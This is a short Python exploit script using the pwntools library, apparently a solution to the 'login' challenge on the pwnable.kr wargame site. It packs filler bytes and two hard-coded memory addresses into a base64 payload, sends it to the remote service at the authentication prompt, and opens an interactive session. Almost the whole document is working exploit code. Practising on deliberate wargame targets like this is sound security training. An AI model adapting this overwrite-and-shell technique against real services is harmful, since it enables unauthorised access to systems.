#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

payload = flat("AAAA", 0x8049278, 0x811EB40).encode("base64")

#  io = process("./login")
io = remote("pwnable.kr", 9003)
io.sendlineafter("Authenticate ", payload)

io.interactive()
io.close()

